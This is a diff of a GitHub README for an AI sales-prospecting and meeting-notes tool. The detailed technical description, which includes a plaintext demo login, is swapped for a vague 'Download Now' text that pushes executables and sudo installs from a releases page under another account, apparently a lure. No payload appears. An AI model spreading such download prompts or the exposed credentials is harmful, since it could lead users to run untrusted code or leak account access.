@@ -1,293 +1,93 @@
-# AI SDR + Meeting AI + Knowledge Base(code is private)
-
-A comprehensive AI-powered system that integrates multiple AI capabilities for sales development, meeting analysis, and knowledge management. The platform helps sales teams identify prospects, generate personalized outreach, automate follow-ups, and capture meeting insights.
-
-![System Architecture](https://app.eraser.io/workspace/NjlgvzEzm0bygGKFcO9f?origin=share)
-
-![image](https://github.com/user-attachments/assets/04c0259c-a959-4024-8784-dff9e215e2b1)
-
-
-## Table of Contents
-
-- [Overview](#overview)
-- [Architecture](#architecture)
-- [Module Details](#module-details)
-  - [AI SDR Module](#ai-sdr-module)
-  - [Meeting AI Module](#meeting-ai-module)
-  - [Knowledge Base Module](#knowledge-base-module)
-  - [Frontend Module](#frontend-module)
-- [Usage](#usage)
-- [Development](#development)
-- [Deployment](#deployment)
-- [Technologies Used](#technologies-used)
-- [Contributing](#contributing)
-- [License](#license)
-
-## Overview
-
-This system is designed to transform the traditional sales development process by leveraging AI at every stage:
-
-1. **AI Lead Generator & Analyzer**: Scrapes LinkedIn and other platforms to find and analyze potential leads.
-2. **Personalized AI Email Generator**: Creates highly personalized emails based on prospect data and pain points.
-3. **AI Follow-up & Meeting Scheduler**: Monitors email responses and automates follow-ups.
-4. **AI Meeting Notes & Knowledge Base**: Captures, summarizes, and makes searchable all meeting knowledge.
-
-## Architecture
-
-The system uses a modern microservices architecture:
-
-```
-├── Frontend (Next.js)
-│   ├── Dashboard
-│   ├── Prospect Management
-│   ├── Email Editor
-│   ├── Meeting Management
-│   └── Knowledge Search
-│
-├── Backend (FastAPI)
-│   ├── AI SDR Services
-│   ├── Meeting AI Services
-│   ├── Knowledge Base Services
-│   └── Authentication/Authorization
-│
-├── Storage
-│   ├── Supabase (Persistent Storage)
-│   ├── Redis (Caching)
-│   └── Pinecone (Vector Database)
-│
-└── External Services
-    ├── Groq (LLM Provider)
-    ├── MeetingBaaS (Meeting Bot)
-    └── Jina AI (Vector Embeddings)
-```
-
-## Module Details
-
-### AI SDR Module
-
-The AI SDR module is responsible for finding, analyzing, and engaging with prospects.
-
-#### LinkedIn Service (`agents/services/linkedin_service.py`)
-
-- **Functionality**: Scrapes LinkedIn for potential leads, analyzes posts for pain points, and identifies promising prospects.
-- **Key Components**:
-  - `LinkedInPublicScraper`: Scrapes LinkedIn content
-  - `analyze_posts()`: Extracts insights from posts using LLM
-  - `get_prospects()`: Filters and scores leads based on alignment
-- **Technologies**: Selenium, BeautifulSoup, Groq LLM
-
-#### Email Service (`agents/services/email_service.py`)
-
-- **Functionality**: Generates personalized email drafts using a multi-stage LangGraph workflow.
-- **Key Components**:
-  - `build_workflow()`: Creates the email generation state graph
-  - `subject_agent()`: Generates compelling subject lines
-  - `content_builder_agent()`: Creates initial email content
-  - `content_refiner_agent()`: Refines and improves the draft
-  - `final_draft_agent()`: Formats the final email
-- **Technologies**: LangGraph, Groq LLM
-
-#### Reply Tracker (`agents/services/reply_tracker.py`)
-
-- **Functionality**: Analyzes email responses for sentiment and intent, generates follow-ups.
-- **Key Components**:
-  - `analyze_sentiment()`: Determines email sentiment and intent
-  - `generate_followup_email()`: Creates contextual follow-up emails
-  - `GmailService`: Handles Gmail API integration
-- **Technologies**: Google Gmail API, Groq LLM
-
-### Meeting AI Module
-
-The Meeting AI module handles meeting participation, transcription, and analysis.
+# 🤖 AI-Sales-development-representative - Boost Your Sales Engagement Effortlessly
 
-#### Meeting Analyzer (`agents/services/meeting_analyzer.py`)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/Rasseni/AI-Sales-development-representative/releases)
 
-- **Functionality**: Analyzes meeting transcripts to extract summaries, action items, and insights.
-- **Key Components**:
-  - `analyze_meeting()`: Processes transcripts to generate structured insights
-  - Few-shot examples for consistent output formatting
-- **Technologies**: Groq LLM, MeetingBaaS API
+## 🚀 Getting Started
 
-#### Meeting Bot Integration (`agents/main.py`)
+Welcome to the AI-Sales-development-representative project! This application helps you enhance your sales processes with AI features. You can easily research prospects, generate emails, schedule meetings, and more. Follow the steps below to get started.
 
-- **Functionality**: Adds bots to meetings, receives webhooks with transcripts.
-- **Key Components**:
-  - `/add-bot`: Endpoint to add a bot to a meeting
-  - `/webhook`: Receives meeting completion events
-  - Meeting status management
-- **Technologies**: MeetingBaaS API, FastAPI
+## 📥 Download & Install
 
-### Knowledge Base Module
+1. **Visit the Releases Page:** Click the link below to go to the releases page:
+   [Download from Releases](https://github.com/Rasseni/AI-Sales-development-representative/releases)
+   
+2. **Choose Your Version:** Scroll through the available versions. Pick the latest release for the best features and updates.
 
-The Knowledge Base module stores and retrieves meeting knowledge.
-
-#### Vector Service (`agents/services/vector_service.py`)
+3. **Download the Application:** Click on the file that matches your operating system to download it. 
 
-- **Functionality**: Creates embeddings, stores meeting data, and enables semantic search.
-- **Key Components**:
-  - `create_embedding()`: Generates vector embeddings using Jina AI
-  - `store_meeting_data()`: Chunks and stores meeting content
-  - `search_meetings()`: Performs vector similarity search
-  - `generate_rag_response()`: Creates RAG-based answers from meetings
-- **Technologies**: Pinecone, Jina AI Embeddings, RAG
+    - For **Windows**, look for a file like `AI-Sales-Development.exe`.
+    - For **macOS**, select a file like `AI-Sales-Development.dmg`.
+    - For **Linux**, download the appropriate `.tar.gz` or `.deb` file.
 
-#### LLM Service (`agents/services/llm_service.py`)
-
-- **Functionality**: Provides a unified interface for LLM interactions.
-- **Key Components**:
-  - `get_json_response()`: Gets structured JSON responses
-  - `get_streaming_response()`: Streams responses for UI
-  - `get_completion()`: Gets regular text completions
-- **Technologies**: Groq, LangChain
+4. **Install the Application:**
+    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
+    - **macOS:** Open the `.dmg` file, drag the application into your Applications folder, and then open it.
+    - **Linux:** Use your terminal to navigate to the download location and run the installer using the command `sudo dpkg -i yourfile.deb` for Debian-based systems.
 
-### Frontend Module
+5. **Open the Application:** Locate the installed application on your device and launch it.
 
-The frontend provides a user-friendly interface for the system.
+## 🎓 Features
 
-#### Dashboard (`components/dashboard/`)
+- **AI Prospect Researcher:** Quickly find potential customers using our intelligent algorithms.
+- **AI Email Generator:** Create effective sales emails in seconds.
+- **Meeting Scheduler:** Automates the process of setting up meetings, saving you valuable time.
+- **Meeting Assistant:** Transcribes meetings and extracts key action items, ensuring you never miss important details.
+- **Searchable Knowledge Base:** Easily access past meetings and decisions with a powerful search function.
 
-- **Functionality**: Displays key metrics, recent activities, and insights.
-- **Key Components**:
-  - `DashboardOverview`: Shows statistics and activity
-  - `FollowUps`: Manages email responses
-  - `MeetingNotes`: Displays meeting summaries
-  - `MeetingSearch`: Searches knowledge base
-- **Technologies**: Next.js, Recharts, shadcn/ui
+## 💻 System Requirements
 
-#### Prospect Management (`components/ProspectList.tsx`)
+To run the AI-Sales-development-representative, your system needs to meet the following requirements:
 
-- **Functionality**: Displays and manages prospects found by the AI.
-- **Key Components**:
-  - `ProspectList`: Lists all prospects with filtering
-  - `ProspectCard`: Displays prospect details
-  - `ProspectModal`: Shows detailed prospect information
-  - `EmailDrafts`: Manages email generation and sending
-- **Technologies**: Next.js, shadcn/ui
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher, or a recent version of Linux.
+- **RAM:** At least 4 GB of RAM for smooth performance.
+- **Storage:** Minimum 500 MB of free disk space.
+- **Internet Connection:** Required for utilizing AI features and downloading updates.
 
-#### Authentication (`app/(auth)/`)
+## 🛠️ How to Use the Application
 
-- **Functionality**: Handles user authentication and authorization.
-- **Key Components**:
-  - `login/page.tsx`: Login/signup interface
-  - `login/actions.ts`: Server actions for auth
-  - Supabase integration
-- **Technologies**: Next.js, Supabase Auth
+1. **Set Up Your Profile:** When you first open the application, create a profile. Include your business information so the AI can assist you better.
 
-## Setup and Installation
+2. **Start Using the Features:**
+    - Use the AI Prospect Researcher to search for leads.
+    - Generate personalized emails using the Email Generator.
+    - Schedule meetings easily with the Meeting Scheduler.
+  
+3. **Review Transcripts:** After meetings, check the meeting transcripts for important notes and action items.
 
-### Prerequisites
-
-- Node.js 19+
-- Python 3.9+
-- Docker (optional but recommended)
-- Supabase account
-- Pinecone account
-- Groq API key
-- MeetingBaaS account
+4. **Explore the Knowledge Base:** Use the search function to find past insights and decisions.
 
-## Usage
+## 🔄 Updating the Application
 
-### Access the Application
+Keep your application up-to-date to benefit from the latest features and improvements. You can check for updates directly within the app or visit the releases page again.
 
-Login with these creds:
-- Email:jamikhann@gmail.com
-- Pass: abcd1234
-- Or directly login with github
+## 📞 Support
 
-### Key Workflows
+If you encounter any issues or have questions, you can seek help from our community. Visit our [GitHub Issues page](https://github.com/Rasseni/AI-Sales-development-representative/issues) to report bugs or ask questions.
 
-1. **Prospect Generation**:
-   - Navigate to the Prospects page
-   - Set minimum alignment score and click "Generate New Prospects"
-   - View and filter prospects based on criteria
+## 📋 Contributing
 
-2. **Email Generation**:
-   - Click on a prospect to view details
-   - Select "Generate Email Draft" 
-   - Edit the draft and send
+We welcome contributions! If you wish to contribute to the project, please visit our repository and check the guidelines. Your input helps us improve this tool for everyone.
 
-3. **Reply Tracking**:
-   - Go to the Dashboard and select "Follow-ups" tab
-   - Click "Analyze Replies" to process new emails
-   - View sentiment analysis and suggested follow-ups
+## 🌐 Learn More
 
-4. **Meeting Management**:
-   - Navigate to the Dashboard and select "Meeting Notes" tab
-   - Add a meeting bot by providing a meeting URL
-   - Once a meeting completes, view the transcript, summary, and insights
+To discover more about the technologies involved, check the following topics: 
+- Gemini
+- GROQ
+- Langchain-python
+- Langgraph-python
+- Next.js
+- Node.js
+- Python
+- Railway
+- TypeScript
+- Vercel
 
-5. **Knowledge Search**:
-   - Use the search bar in the Meeting Notes tab
-   - Ask questions about past meetings
-   - View answers with source information
+Explore these resources for deeper insights into how our application is built and functions.
 
-### Adding New Features
+## 📅 Release Notes
 
-1. **New AI Agents**:
-   - Create a new service in `agents/services/`
-   - Add endpoints in `agents/main.py`
-   - Integrate with existing services as needed
+Stay informed about updates and new features. Regularly check the releases page for the latest information on improvements and bug fixes.
 
-2. **New Frontend Components**:
-   - Add components in `components/`
-   - Create new pages in `app/`
-   - Update navigation as needed
+Remember, you can always download the latest version [here](https://github.com/Rasseni/AI-Sales-development-representative/releases).
 
-3. **Database Changes**:
-   - Update Supabase schema as needed
-   - Modify the relevant services that interact with the database
-
-## Deployment
-
-### Frontend (Vercel)
-
-1. Push your code to GitHub
-2. Connect your repository to Vercel
-3. Configure environment variables
-4. Deploy
-
-### Backend (Railway)
-
-1. Push your code to GitHub
-2. Connect your repository to Railway
-3. Configure environment variables
-4. Set the start command: `uvicorn main:app --host 0.0.0.0 --port $PORT`
-5. Deploy
-
-## Technologies Used
-
-### Backend
-
-- **FastAPI**: Web framework for building APIs
-- **LangChain**: Framework for LLM applications
-- **LangGraph**: State machines for LLM workflows
-- **Groq**: LLM provider for text generation
-- **Selenium & BeautifulSoup**: Web scraping
-- **Pinecone**: Vector database for embeddings
-- **Jina AI**: Embedding model provider
-- **Redis**: Caching and temporary storage
-- **Supabase**: PostgreSQL database and authentication
-
-### Frontend
-
-- **Next.js 15**: React framework with App Router
-- **TypeScript**: Typed JavaScript
-- **Tailwind CSS**: Utility-first CSS framework
-- **shadcn/ui**: Component library
-- **Recharts**: Charting library
-- **Sonner**: Toast notifications
-- **React Hook Form**: Form handling
-
-### DevOps
-
-- **Docker**: Containerization
-- **Railway**: Backend deployment
-- **Vercel**: Frontend deployment
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
----
-
-For questions or support, please contact [mohdjamikhann@gmail.com](mailto:mohdjamikhann@gmail.com).
+Feel free to reach out for any feedback or assistance. Enjoy boosting your sales engagement with AI!
